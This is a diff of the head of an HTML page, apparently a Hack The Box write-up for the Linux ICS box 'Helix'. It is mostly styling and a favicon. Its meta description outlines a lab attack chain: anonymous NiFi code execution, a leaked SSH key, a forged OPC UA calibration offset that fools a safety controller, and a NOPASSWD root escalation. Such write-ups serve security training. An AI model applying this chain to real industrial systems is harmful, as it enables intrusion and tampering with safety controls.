@@ -3,74 +3,541 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="Hack The Box: Helix — rooted by db-d2 (active box, write-up locked until retirement).">
-<link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NCA2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiByeD0iMTQiIGZpbGw9IiMxNDFhMjQiLz48aW1hZ2UgaHJlZj0iZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFFQUFBQUJBQ0FZQUFBQ3FhWEhlQUFBQUNYQklXWE1BQUE3RUFBQU94QUdWS3c0YkFBQUR4a2xFUVZSNDJ1MmJPMmdVVVJTRy83T0VJQ0dFTlFRSnFVS0tGS2tpaUlLSWpaVVNHeEhSVGhBeHBXaWhpS25TS0dJcFZnSEZRa0hCd2pvR0ZTMVVTRUJRRk9LclVZeVBhRUNOcUovRlhtVWRaK2V4TTdNN0UrZUhhVGJubnNlZnVlZitkKzlkVTRzQWRFamFLR21McEZGSmc1SjYzSjgvU1hvdWFVN1N0S1E3WnZaZEt3RkFIekFKdkNJNlhya3hmVVV1dkFJY0JEN1NQRDQ2SDVXaUZiOEdtQWtwN2dGdzFqMFBRbXhuZ0RWRktYNEltQThvWmduWUNkU1BrZnRzS1dEY1BEQ1U5K0w3UTRvSEdBc1lQeFl5ZGo2M2J3TFFBZHdLS2VCMkJEKzNRM3pjY0N0S0traXp1UnlTdENuRTVub0VQMkUybTEycy9CQUE5RXVhaUdDNm5KTE5oSXVabXpmZ3NLVHVDSFliVXJMcGRqRnpNZmM3Z1hjUjEvVWZ3R2lBcjFGbkV3WHZnTTQ4RUxBdHByaDVCb3o0K0JrQlhuaHNsNEh6d0JsZ3djZlh0andRY0xvSmhiY01YQURHM1hQQmZkYXdRR0RRUjFXZXpnTUJNMlNERno2eExuc1ZZaDZhNEdCRzNQWUNYWjdQQnRLT25RWUIxWXdJNkpZMEJmU2ZSbnZNYmFkVGpXMHBUSUVQR1pJZ1NUL2Q0NmYrRnMxc2RSTG5IY28vS2lrcjF0UUoyQ2VwWGV2eE41WElzQWU0cmVkbVNkNnZwdDZhMlJWbnMxZlNxamJsLzlYTXpyazhkdnJsS2VtbW1iMkoyOWdFSEFlK05GaWpaK3ViSU8zRGg3bzhaaHZZZkhHMXhPb0JSeVZOcnBDM2ZKV3I1YnVrRTZFNkFPaUp1TFV0R2laY2JhRkNhS09rcmhWSVFKZVBrUEtkQW1tS21pZVNqcWgyNk5Hc3pENHBhVGlsZktxdEZFSS9KVzAzc3ljSmZNd0JEeVU5eWtvTVpYbmdzSml3K05vNlhmT3htS1hNekFxOXdMb1U5aHJySlBYbVdRb0g0Um93S2VscGsrT0hzbDZSc2lhZ1g5S1p2TyswL211VUJQenZCR1RkQTE0N0haNjBDZllYbFlEdFpuWS80VEo0VjlLOUlrNkI5MG1MZDBMb3ZxVDNSU1NnQ2lUVzhNNUh0WWhUb09LRVVCcWJvVXBSZThDd3BLdmxNbGdTVUJKUUVsQVNVQkpRRWxBU1VCSlFFbEFTVUJKUUJBS2lYSG10UDJSODJjYjhYemJJcVJIQ2F3T21JNTdOcjNmMkE4RGpOdHdOZUF3TXVCeldSeHd6SGZybFE0eTd1bE4xNDFwTndwL2lYZnlwR0hlVmg0TUlPQlVqaWFYNjgvWVdrdUF0dmlma3B6WmVuR3BVZkdlREM4bEJHUGY0eUpxRXY0cDNNY2RqK2xpb3YyVnVkWTUyUzdvWXN3bk5tZGxhTDVISzdvTEZaelA3NW9rM3E5b1BNZU5najVsZGFyYjUrVGJEZGlCRzh3dHVoakdiWDhObTJBWUNwcHJNK1U4ei9LMEQ5aWNRUmJ2OExoKzFvUGdlU2JzUzZKLzlTWnBmWUROc0VRSGpDWE5lQURvcmtuYm8zeHVXY1hHZ0RUTWdhY3crU1RzNkpHMVY4d2NYdjFFRlJzenNZWXYrK3lPcW5SWWx6WHZyTDJnUnBkVUFXVkhtQUFBQUFFbEZUa1N1UW1DQyIgeD0iOSIgeT0iOSIgd2lkdGg9IjQ2IiBoZWlnaHQ9IjQ2Ii8+PC9zdmc+">
-<title>Helix — HTB · db-d2</title>
+<meta name="description" content="Hack The Box: Helix — a Medium Linux ICS box. A hidden vhost runs Apache NiFi with anonymous access and the execute-code permission, an operator SSH key is left in NiFi's own support-bundles, and forging an OPC UA calibration offset makes the root safety controller authorize a maintenance window that a NOPASSWD console turns into root. Write-up by db-d2.">
+<link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NCA2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiByeD0iMTQiIGZpbGw9IiMwZDEwMTciLz48aW1hZ2UgaHJlZj0iZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFHQUFBQUJnQ0FJQUFBQnQrdUJ2QUFBU0tFbEVRVlI0MnUyY2VYQWMxWjNIMysrOTdwNlpucU5uTkpLc1c1YXQwNGRrR3h2akF6Q25NYkpzQ3hzQ3d0NXNRdGl3VktwUzJjMG1sYTBRSUtuOHNjdHVzc1Z1SlJTcENzVm1vWklOdFJ3aElRY2toQnVjaEhCWWxvd01OcFl2MlpJc1RjLzBkUGQ3NzdkL3RDeGtXYWRuTkJJdWRla2ZlM3A2M3Z2MDkzZTgzenNnSEYxQWNuZ0JaU2c0ZDVJQTFCOHJDeGN2RFJjdjFlTUx0WENoNGc5VHBoRkNwSEJGT21HYlBhblRINW5IMnhQSDkxbG51bEVLUlFzQ1UxQktRakIzRGM0WklBQ0tLTGx0cWdFalZyVXVYcnNwWEx4VTFXTkFLVXFKVWlBS2d1amRDa0NCS3Q1SGJxcmZQTEgvOUlFLzlILzR1bXVkVVh4QkFJWW9MeVpBQUpUeWRJSnBldUd5NXVLbVZqMi9DaEVsVDZQZ1NCQUllUGNoUVVMSXlIOENJY0JVcXZnQklOVjc2TVE3VC9XOC95eTNrNG8vbkJzcHpUd2dvQVFsdDgyOHhSc3FOMzR4VkZRdjNiUncwd1FBQUFnQlFnaEtBWlFDMHlobGhCQXBCUW9IcFFUS1BGQ0lTQkNaNnFlcTN6eDU0T05YSHU3dGVpazNVcHBaUUVDWmROT0Uwc3FOZHhXdnVwbWdGRTRLZ0JJWTBnaEJTWUFxdnBBVWpwMDQ0Wmg5aEJBdGxPY0xGMUdtY2R2MGJqaDdNeUpLcGdVQTJQRy8vdC9obDM4b0JXZXFINlg0VkFJQ3lvU1RVb041dFRmZUc2MjgxTFg2UFdNYnZnRlJNc1dIS0h2YW56djJweWVUSjd0UXVvUVFvR3B3UVhYSjZ0YkNKVnNBcU9EMnFHOFJRdFJBZE9ESVh3Nzg4ajRuY1lyNWdqUEhhS1lBQVdYQ1NmcU4wb2JXZnduRUYzSnJBS2d5OGdaRXlkU0FrempaK2V6OWZRZGZMN2wwWThWVjE0WEtGeEpDRWg4Zit2akYzeDU3NjlYNDRuVjFXKy9Wd2d1RWE0MWtSQWhCeVJXL1lmVi92UC9KcjZmN2o4d2NveGtCQkVBRlQvdENCVXQzZmQ4ZkxlTjJZaFFkZ2doTTVla3o3engydDNCNk45ejNRUEUxMXpGVlZSR1JFR0JNdXU3aDMvM20xZnYrU2RIaWpiZi9RUEZIVWJpZkdPWXdJMThvUFhoaTM4Ky9ZZytlWUtwL0p2d1I4L2xEV2NlRFVqREYxOUQ2cjNyQjRqSG9lRCtzK2pxZnZTOTF1dlA2SC8yMGJOT21FdUg0WGFmWFRLTHJDTXVTcmx2UXRMSm85ZnJPSng1Sm5UNWN1SFF6Q2o0S0VBQ1ZQSzJGOG8yeUZiMmRMMGp1bkhYcWN4c1FBQldPVmIzNUczbUwxNTl2V1o1eEtiNVEvK0UzRHo3L0grdisrYnNWTjJ6WndNU1dpcUttUE1PU2VNU3lWWVVSQUhkd01GWlRxK3FSL1Q5L0tMcHdsWjYvU0hJYnptZmtXb0ZZdWQ4b1B0WHhQR1ZhMWdNL3picnJjZE9EUlUwN0NwZmU0S2JPaktrZGdnaVU5cno3bkZGUlZibGxxeTlwTnVYSGtsd0l4Sld4aUFMZ1pZdFVWZE5uK2hjMWJ6UEtGL2E4K3h4UU9wUkdqdjVGeFUyZHlhKy9ybmpsTHA0ZXlMcUlhSGJGSTkxMElGWlJzZUVPWVNkSHVkVnovTGRyRFhidksxeTVXbzlGemJUZFk3c1JWUWt3ZXRSS2M4UWhsUUFnNTc1b3RIRGxtc0h1ZmNLMXh1czhVTXB0czJMZDUvWDRJaS9EbXFPQUFLamtUdm02ejJyQnVEelBwdzdyeDdNTDEwb0VGNVFBVUk3NFRIZlBhNmZPdkhDaTcvY24raFNnSTRVQ0FNR2lFdGRLeUtGQU5xWUZBUXBYMWFQbDYvNFdoUU56RkJCUTRhVENwY3Z5NjY3bGRtSmlxUU5sbENrOGJTRWhLc0NneTM5OTdQU0xKL3M0SWoyM2QwZ0lUMXVVS1pNK2tLY1Q4ZHFySW1VcnVKMGFUN3l6Q1FnQVVQQ2lwbGFtK2xGT0VHNEJwV0JheUI4cjZUK3dYem9PQWlnQXVrSjFoY0w1TnVzNC9RZjIrMk1sVEF1aEZJU01xdzVFU1JXdGFFVXJRVEgzRk9SNW4zaGwzcUlOM0VsTy9MWVJKVkFsdjI3anliZjM5aDg0b09xNkZFSWlrZWRhRHdxaDZuci9nUU1uMzk2Ylg3Y1JxT0tsT1lnU3BTQ0lLTVhJeE1kTDNHTlZsK241aXdUUG1pZWkyZkkrd2szbkxkNm9CbU1vK0ZUeWdNSmxXNWdTL3ZPRER3QlRRRkVrNTU4RUtVVEpPU2dLTU9YUER6N0FsSERoc2kzQ3NZQlNSS2xxQVY4d1NsVy9MeGhWdGNCSVJpaTRHb2ptTGI1Y3VuYTJyQ3g3ZVJDUWl2VmY4SVVYU09sTzRpWUJVTGhxTU82THhELzQxVVBwM29HS3E2NVJkUjJGSUZJU1FvQXhMUlFHb0s5LzU5NnVYL3h2L2JaN0l1V3JoR3NSUWpSL3FMZTdZLy92SCs3ZDkzVDNnYjFxTUI2Smw0a1IrUkZRUmhYdGRNY0xaQTRCQWtEdStJM1M4clY3UmhaM0pvdDNkcmg0bWVvUGRqNzFYOGZmZUQwUUx3emtGNmk2VGhYRlRWbkgzM3o5bFc5KzlhUGZQVk96K2F2RksyL210a2tJMGZ6Qjd2MnZwRi81NW5kdk1MKzBpYTNPNjM3aHVhZE10VHhXVXVzeEFnQkVvZnFOdm9NdnU2aytZRXJtZ0pSc1NBZUVjSUtGTlVyQTRMWTVSVzBEVUdFbnk5WitWbzlYSHZ6ZGc3KzlhMCtvcERSVVhFSUlNWThmTTQ4ZERSWXNibXI3ejd6cVRjSTJBUUNBcHBPRC9XLzk0TmRmWHJSOGFiR2JzQzl0TEZsUmRXTHo5MzRRcjJ4U3RRQ2k4Q0tBNG84RUMydFRwN3BBOWY1enRnRVJBSlF5V0ZBTmxCRkVBdFA0SXJjVGVkVlhHaFdyenh6ZTIvL1IzblRmTVVKSXRHSlQxWlZyb3BWcm1CYmtkc0tyMVdvK2YvZkI5elpVV010cmF2cFBtUXFqNWlsemVVMyt4c3J1ZHc3dlg3UjB2WjAyQVlBZ0F0QmdZWFhQKzlrWmMyUURFQ0pRSlJBclJ5bW1HenNBS0xkTm9DeGVjMVYrM2JWREVSb1lTaUhjMUxsNmhER3lSQnp4NGZEYlFoR0lsUU5UeHh5YXpBSWdSRWxWVFFzWG9CUndJZnJ6YXJJSmdqakVGOUVyeUE3VEFRRFhTUmRWMUwzeXB2KzlydDdsUzRyY2hLM21CZDVyNzNuNWtGYTdwdDUxMHA2ZkJrSlFDaTJZejFSZlZxb2ZtVHRwSUloVTBZb2FkekJOUjhFSlFZTFQveHNML01nL0tia3ZFSGFWK0UrZmVOS2dLUzc1QzN1UGZ1bkhoNEpydmh3dmErQ085Y2xYZ0tCd1RyWC9SZ28zODJDZkhRVXh4YWVGQzlTQWdlTU93YkpoeWxKV3JkNXhxbkRSMTk1NFNuMnAxMVhySzI3Y1hyaHdoWk0ydFdEZWlGS2NRcEJReFMrY0ZJRk1CL2VaVnhRQlVURFZYOVMwZzZwK2dwS1FtUUdFaEFCQktWU2ZUcG5LWFVkUk5TbGMxN2FBVXUvVHMvZFJ5WjBUN3o0bG5CUUF5N0JDbEtXU0t5SjNrbGx4aWxNUkVucERQMFFnWk95RUVFRFJnbG5Sc3BLZFJnT29BWVBNcFN0Yk5YeGxyalZvcmwxVEFrUXBQVit1S0NXT3NDbkdHTXlZZTc2QWkzTStzaFFEbEk0UlhLVE1HQkFBUVV3bFRUbTZGb09hejY5cVBxLzBnNGhuK3ZwbTBFTlAzNStIREdNb002TFVkV3pIVG85cVA2WE1IOUE5WDNhaGdBQlFDaW5sNnZXYlNzb3JoeDhFQUk1dHYvdm5OMDRjL2RnZjBEbm51cTdmZmZmZEFUMGdwWVRaWmtNcFRhZlRqL3o0RWRNMFZWVk5XNmtGSmVWTmwxeW0rZjBqdWtDUGR4OStaKzlyQklBeE5nR2ppYU1ZQ01ILzVvdGYyWGpOalZLSWtTOEFBQktEQXc5Ly96c2Q3NzFObVJxUDU3M3o3anV4c0cvV0pZU0VVRUlTbG1ocWJEcHg4aVFLVWJOaytWMy8rSzJJRVJ0RmdWTDIyb3UvZWZTSC8wNHB2UkFGVVVwVFNYUDErazBicjlreWNLYjNuQ0lHRUNsa0tHSzAzbmJIQXgzL0lJUkFnbjE5ZllUa3VhNDd1NTRJRVJWRkdSZ1lHRm9Rb3JEVzJ6NGZDaHNEL1gyVTBaRXBFUkxjY05YbWQvL3k1aHN2UFI4TWhzYnpSOHBFVlZRcFM4c1hDaUdBQUdWczFBREtUbHZSdkhqRWlKNCsxUU1FR0dPS29pRGlYQUNrS0FvaFJBaHVSQXRpOFlKMDJtS0tNcXBoVWdqT2VXbDVKVW81UWNha1RQcDc0M1VZQUthYkZ3b2hNT05rRWdBWVk5TkNObEVYSm11UGtyTVhTd2hFbzdxU1dlWVBoQWhDQmhOMnpxU3E1SVlPWTVSUitzVFBuMjdmMXc3MHdqc21wV3hvYUdocDJZcUVjQzV5d0NnbkNnSmdsTnoxOTNjLzl1Z2pCSlRNaG14QWlQdVp0ajBQLytpaGkwUkJRb2lvb1QveHhOT1BQZnBJcktDSVpNTUgvZXp4bnpRM043ZmR0cXQvSURVdGZ6UVhBU0VpQTlMZTNnNmdFTVNSSTRBTGJMR2lBS2o3MnRzcEVKejUrZ0VsODllcyt5QWdKS0RyaUpJeEprU21nMzdHR0tMVUEzcHUwcTBaVnhDbE5PV0k1aHUzUk9QNXAwK2ZGa0x3REM0aFJHOXZiemdhMjdxMU9lWElpVWNKbnc0RlVVb3R5Nm12cjMzODhmKzU1NTV2SFR0MmZDcnAyUVI1WFYxdDdmM2Z2bS9ac29hRWFWME1nRHhHQ2RPNitwcXJObXo4UTA5UFQ0WlBLeWdvQ0FUVVJDSVhkSEtYU1ZOS0V3bUxNVnBVVkpUaG8xelhIUnkwR010UmVNa1JJRUtJMXlYSGNiSXhGc3RkOEowUDgzTkdRVkpLQUZCVk5YTVRreEl2TmhPVFVvWkNBZGVWcDArZk9sdDBuRzRnRy9wV1BKNnZhY3cwTHlJbjdkRjU2WTh2Zit1ZWU0OGVQVW9BY0dqcjNQVDRBQUZDc0xpNCtQNzc3N3Y2NmswWFNaaVhVdnI5MmdjSHVtNjl0YTJ2dDFjUEJqTVpRQUhBa1NQZHQ5N2E5dUlmLzFCYlcyMVp6a3d6b2prQXBQdllzNy84VmQrcG52eUNBa1ZSMUF3dVJWSHk4L01IK25wLzhjeXp1c2FtTXJIMTZmQkJxV1FTZ0dhbDVDcUVBS0RKVkRJM081L253L3hzS3dnQUJKTDYrbnBFRndDOCtZYU1Ia2dwb2x0Zlh5OEp1UmhLcm95eGhHbTN0RFIvcG0zUHp4Ny9DWUhNbGc0Q0VIUjIzdExXMnJwdE1HSFBkRG1SNUt4b2owZ2YvdEhEemMzTjdlMzdBT2dGTWdKQWxQWDFEYTJ0Tzd6Rm1oZEowUjRBdUJBQTBOYTJpNUZkV1pyMmtSZlB0QTg1Nnl6Nno2U3lOWEdZcy9uYjNJM0ZQSC8wcVl0aTgyRitIdEE4b0hsQTg0RG1BYzBEbWdjMEQyaittZ2MwRDJnZTBLY1lFQ0xPblY1bHNURlpBT1J0ajFCVk5RZHpERk81cEpTS3FsSktzNElwQzRBVVJoT0RneWRQbmd3RzFjd1hrR1Y0Q1NHQ1FlMVVUOC9nd0lDaUtKa2ptZ1RRcEhVcFJHU01KVk9wUGJmZmZyRHJVQ1FTNUh6V0dISE93K0hnNFVOSGRyZTFKUklKaFNtVGltalNEazRNQ0thaUNDbFIxL1hPQXg5czM5WjYrTkNoU0VTZkZVYWNpM0E0ZUxUN3lQWnRyZTN0Ky9WZ1VKN2R5emF4NGk0UUVCQ0NLSVBoOElTdWgxSEdDS0lRd2pDTXJxNnVscGJXUTBPTWVNN3A2TjFIdXJlMXRIWjBkaHJScURkSnlSU21xT1BPb3lCaU1CUVoyaHc4TFVCQWFkcEtWVlhYcjkrMDJVb2w2WGxyVFFCQWNCNk9HS1hsVmE3ckFBRG5QR0lZQjd1NnRyZDRPZ3Jtak5FUW5lN3U3ZHQyZEhSMEdvYkJPUWVnam1QWE5DdzNvbm1jOC9OTmlUS1d0bEtYWFhGdGRkMVNLNVVhYjQ2Zmp1ZGFDQ0U3ZDkrcEIwTkNqSE13RmlKanJIWkpvenk3bmNoajVPa29aNHc0RjVHd2ZyUzdlM3ZMam82T1RpTnFlRCtLQkNsbGwxeDJ4Y1QyRmREMW5idnZuQ0RralFHSU1aWTBFNWRmMjd4czVacVVtUmdQTFZEZ3JydTRib2svb011emxqeXNvMjFEdGphempJYTFzNjFsUjBkSHh6QWRBSEFkdTZpMHZMcCttWjBlZDVVTXBUUmxtZzJOcTY3YzNKSTBCOGVjVXhqRGRtemJYbEJjMW5Mem5yU1ZndkVYbHdCUXgzV0tTaXNLaTBvOEt4dkpxR3VJMGVGSUpPZzRUb2JMbzhkY01PMDRUaVNzSCswKzB0S3l3L003d3k4REtIVnN1M0hWMm5ERUVCTWVHZVk1aythZHR4ZVhWZHAyK254TFZNNEg1THJPanRzK1o4VGl5Y1FnblhDaVJnb2VERVdxYWhvK1BuVFE1L3ZrTktOaFJ0dGJkano5ekpOMTFRdXp2cGZWMjV2YTlkR1I3ZHRhT3p1SC9NNG5uMHJwOC9sWFhMcGhUTzh6cXIrY3V4RWoxdHAyeDBQLzltMU44NDJ5TldXVTMwb21CdGVzMzNUcHhxdVRab0pPYlJxcmRzbnlsNTcvNWFnbGRaeHp3ekErK09DRG0yNjZlYytlMjEzdW5aeVROVXFJcUduc3NjZCt1citqSXpwQ081NjBiZHVxcXE2dlhGVGpwTk9USGdCREtVdWFnNnN2dTJMdDVWZS8vdEx6b1hCRWpvajl5amtzWFRjU2piVzIzY0dudGpjWGdMcU9zM0J4ZlRoc2pMU3lUOUkydy9qd3d3Ky84Yld2ejh4bWFQVHB3VkhhR1hhT0s5WnM4UGtENXVEQVZGNno1eTUyM1BxNWp2Zi9hcVZNTmlMRFZNNnhSak94Yy9lZFJhWGxpY0VCTnFYbmd1czYrWVZGSmVVTHV6cmU4d1gwVVVkTVNpRTBUUXNFQ21adTJIVitwaWM0RDRXTnhrdldPbzROZElvSHFvRnIyNFhGcFMwMzcvbnZoNzRYaWhoNDlySEtzRCsza3VhU3BrdXV2RzVyMGt4TWZZNFlwZFI4dnVyNnBSM3Z2KzBmYTVzdlptT1AyRFNHVHBTbWtzbkdTOVlXbFZiWUV3YVo4OU9pcEptNC9Kb2IzMzdyMVgxLy9kTndJazZIWDRYbTgrL2NmYWQzVHRvMFdnUWdoS2hwV0s2b0tzNkowVHdneWxWckwyZU1UWHNsTFNJUzNMbjdDd0ZkSHhZbUhVNThybS9adGJoMmlUVWQ2c01aUjFubG9saGVBZWV6ZktvQUFIRHU1T1VYTmpTdXN1MzBkTS9uQWtyVGxsVzV1Rzd6dGx0U1NkTXpJMHE5VVVWTi9mWGJia2xOeDdoR3RJa2JzWGpGb21yWGNXWWJFTFhUNllibHErSUZDN2g3SVkxaGpLWE14TFV0dTZycmxscFdpcDVOc1dIbjdqdDkvb0M0d0RPQWtERlcyOUFvNVN3ZjNlRU5MMWF0M2VoMTZvSWR2NmI1ZHU3NU93b1VFV2xpY0dERDFUY3NYM21wbFRUcEJaMTNEa0M1Nnk2cVcrSVBCT1RzSGJQa1JhS2kwckxxaHVVVERDK200dWF0cExta2NkVVYxelVuQmdkb1dXWFYxc2xHRlpPMnpIR2M0dEtLQmNWbHJqdHJWZ2FVT283ZHRIcGRPR0tJek9JbVVHcWxVamZlZEh0RlZUVzlxZTBMMFZnOHcxTmJwT1I2TUxTd3VwNjdiaFpQQTUrZWZVbnA4d2NhTDFrMzZmQmlhbzdWalJqUm5idnYvSC8zd2QweDNRZHBjUUFBQUFCSlJVNUVya0pnZ2c9PSIgeD0iNiIgeT0iNiIgd2lkdGg9IjUyIiBoZWlnaHQ9IjUyIi8+PC9zdmc+">
+<title>Helix — HTB Write-up · db-d2</title>
 <style>
-  :root{
-    --font-mono:ui-monospace,"SF Mono",SFMono-Regular,"JetBrains Mono",Menlo,Consolas,"Liberation Mono",monospace;
-    --font-sans:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,"Helvetica Neue",Arial,sans-serif;
-    --bg:#0d1017;--bg-raised:#141a24;--bg-inset:#090c12;--border:#232c3a;--border-soft:#1a2230;
-    --ink:#dfe6f0;--ink-dim:#97a4b8;--ink-faint:#5f6b7e;--accent:#f4a94b;--signal:#63cddb;--crit:#f7546a;--ok:#5fd68a;
-    --shadow:0 1px 0 rgba(255,255,255,.02),0 18px 40px -24px rgba(0,0,0,.8);
+  :root {
+    --font-mono: ui-monospace, "SF Mono", SFMono-Regular, "JetBrains Mono", Menlo, Consolas, "Liberation Mono", monospace;
+    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, "Helvetica Neue", Arial, sans-serif;
+    --bg: #0d1017; --bg-raised: #141a24; --bg-inset: #090c12; --term-bg: #090c12; --term-ink: #cdd7e6;
+    --border: #232c3a; --border-soft: #1a2230; --ink: #dfe6f0; --ink-dim: #97a4b8; --ink-faint: #5f6b7e;
+    --accent: #f4a94b; --accent-ink: #1a1204; --signal: #63cddb; --crit: #f7546a; --ok: #5fd68a;
+    --shadow: 0 1px 0 rgba(255,255,255,.02), 0 18px 40px -24px rgba(0,0,0,.8);
   }
-  *{box-sizing:border-box;} html{scroll-behavior:smooth;}
-  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto;}}
-  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--font-sans);line-height:1.65;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
-  .wrap{max-width:940px;margin:0 auto;padding:0 24px;}
-  a{color:var(--signal);text-decoration:none;border-bottom:1px solid color-mix(in srgb,var(--signal) 35%,transparent);}
-  a:hover{border-bottom-color:var(--signal);}
-  a:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:2px;}
-  .mono{font-family:var(--font-mono);}
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+  body { margin: 0; background: var(--bg); color: var(--ink); font-family: var(--font-sans); line-height: 1.65; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
+  .wrap { max-width: 940px; margin: 0 auto; padding: 0 24px; }
+  a { color: var(--signal); text-decoration: none; border-bottom: 1px solid color-mix(in srgb, var(--signal) 35%, transparent); }
+  a:hover { border-bottom-color: var(--signal); }
+  a:focus-visible { outline: 2px solid var(--accent); outline-offset: 3px; border-radius: 2px; }
+  .mono { font-family: var(--font-mono); }
 
-  .hero{border-bottom:1px solid var(--border);background:radial-gradient(120% 90% at 85% -10%,color-mix(in srgb,var(--accent) 12%,transparent),transparent 55%),var(--bg-inset);padding:44px 0 52px;}
-  .hero-inner{display:flex;flex-direction:column;gap:20px;animation:rise .7s cubic-bezier(.2,.7,.2,1) both;}
-  .crumb{font-family:var(--font-mono);font-size:.76rem;color:var(--ink-faint);letter-spacing:.04em;}
-  .crumb a{color:var(--ink-dim);border:none;}.crumb a:hover{color:var(--accent);}
-  .prompt-line{font-family:var(--font-mono);font-size:.82rem;color:var(--ink-dim);}
-  .prompt-line .u{color:var(--accent);}.prompt-line .p{color:var(--signal);}
-  h1.title{font-family:var(--font-mono);font-weight:700;font-size:clamp(2.6rem,8vw,4.6rem);line-height:.95;letter-spacing:-.02em;margin:0;}
-  h1.title .cursor{display:inline-block;width:.56ch;height:.9em;margin-left:.12em;background:var(--accent);transform:translateY(.06em);animation:blink 1.1s steps(1) infinite;}
-  .thesis{font-size:clamp(1.02rem,2.3vw,1.25rem);color:var(--ink-dim);max-width:52ch;margin:0;}
-  .thesis strong{color:var(--ink);font-weight:600;}
-  .meta-row{display:flex;flex-wrap:wrap;gap:8px 28px;font-family:var(--font-mono);font-size:.78rem;color:var(--ink-faint);padding-top:2px;}
-  .meta-row b{color:var(--ink-dim);font-weight:500;}
+  .hero { border-bottom: 1px solid var(--border); background: radial-gradient(120% 90% at 85% -10%, color-mix(in srgb, var(--accent) 12%, transparent), transparent 55%), var(--bg-inset); padding: 40px 0 52px; }
+  .hero-inner { display: flex; flex-direction: column; gap: 20px; animation: rise .7s cubic-bezier(.2,.7,.2,1) both; }
+  .crumb { font-size: .76rem; color: var(--ink-faint); letter-spacing: .04em; }
+  .crumb a { color: var(--ink-dim); border: none; }
+  .crumb a:hover { color: var(--accent); }
+  .prompt-line { font-family: var(--font-mono); font-size: .82rem; color: var(--ink-dim); display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-top: 6px; }
+  .prompt-line .u { color: var(--accent); } .prompt-line .p { color: var(--signal); }
+  h1.title { font-family: var(--font-mono); font-weight: 700; font-size: clamp(2.9rem, 9vw, 5.4rem); line-height: .95; letter-spacing: -.02em; margin: 0; text-wrap: balance; }
+  h1.title .cursor { display: inline-block; width: .56ch; height: .9em; margin-left: .12em; background: var(--accent); transform: translateY(.06em); animation: blink 1.1s steps(1) infinite; }
+  .thesis { font-size: clamp(1.05rem, 2.4vw, 1.3rem); color: var(--ink-dim); max-width: 56ch; margin: 0; }
+  .thesis strong { color: var(--ink); font-weight: 600; }
+  .meta-row { display: flex; flex-wrap: wrap; gap: 8px 28px; font-family: var(--font-mono); font-size: .78rem; color: var(--ink-faint); padding-top: 6px; }
+  .meta-row b { color: var(--ink-dim); font-weight: 500; }
 
-  section{padding:44px 0;border-bottom:1px solid var(--border-soft);}
-  p{margin:0 0 16px;max-width:70ch;} .lede{color:var(--ink-dim);}
+  .chain { display: grid; grid-template-columns: 1fr; gap: 14px; margin: 40px 0 8px; }
+  @media (min-width: 720px) { .chain { grid-template-columns: 1fr 1fr 1fr; } }
+  .node { background: var(--bg-raised); border: 1px solid var(--border); border-radius: 12px; padding: 16px 16px 18px; position: relative; box-shadow: var(--shadow); }
+  .node .tier { font-family: var(--font-mono); font-size: .7rem; letter-spacing: .16em; color: var(--ink-faint); text-transform: uppercase; }
+  .node .who { font-family: var(--font-mono); font-size: 1.3rem; font-weight: 700; margin: 6px 0 2px; color: var(--ink); }
+  .node .via { font-size: .82rem; color: var(--ink-dim); }
+  .node.root .who { color: var(--accent); }
+  .node .arrow { display: none; position: absolute; right: -20px; top: 50%; transform: translateY(-50%); color: var(--ink-faint); font-family: var(--font-mono); font-size: 1.1rem; z-index: 2; }
+  @media (min-width: 720px) { .node:not(:last-child) .arrow { display: block; } }
 
-  .badge{border:1px solid color-mix(in srgb,var(--accent) 40%,var(--border));border-left:3px solid var(--accent);background:var(--bg-raised);border-radius:12px;padding:24px 26px;box-shadow:var(--shadow);}
-  .badge .k{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.16em;text-transform:uppercase;color:var(--accent);display:block;margin-bottom:10px;}
-  .badge .bname{font-family:var(--font-mono);font-weight:700;font-size:1.5rem;color:var(--ink);}
-  .badge .bmeta{font-family:var(--font-mono);font-size:.8rem;color:var(--ink-dim);margin:4px 0 14px;}
-  .badge p{color:var(--ink-dim);max-width:60ch;margin:0 0 18px;}
-  .badge .blink{display:inline-block;font-family:var(--font-mono);font-size:.82rem;color:var(--accent);border:1px solid color-mix(in srgb,var(--accent) 50%,var(--border));border-radius:7px;padding:9px 16px;}
-  .badge .blink:hover{background:color-mix(in srgb,var(--accent) 12%,transparent);border-color:var(--accent);}
+  section { padding: 44px 0; border-bottom: 1px solid var(--border-soft); }
+  .sec-head { display: flex; align-items: baseline; gap: 16px; margin: 0 0 22px; }
+  .sec-num { font-family: var(--font-mono); font-weight: 700; font-size: 1rem; color: var(--accent); flex: none; padding-top: .15em; }
+  h2 { font-size: clamp(1.5rem, 3.4vw, 2.05rem); line-height: 1.15; margin: 0; letter-spacing: -.01em; text-wrap: balance; }
+  h2 .sub { display: block; font-family: var(--font-mono); font-size: .78rem; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); font-weight: 500; margin-top: 8px; }
+  h3 { font-size: 1.06rem; margin: 30px 0 12px; letter-spacing: -.005em; }
+  p { margin: 0 0 16px; max-width: 72ch; }
+  .lede { color: var(--ink-dim); }
+  ul { max-width: 72ch; padding-left: 1.2em; margin: 0 0 16px; }
+  li { margin-bottom: 7px; }
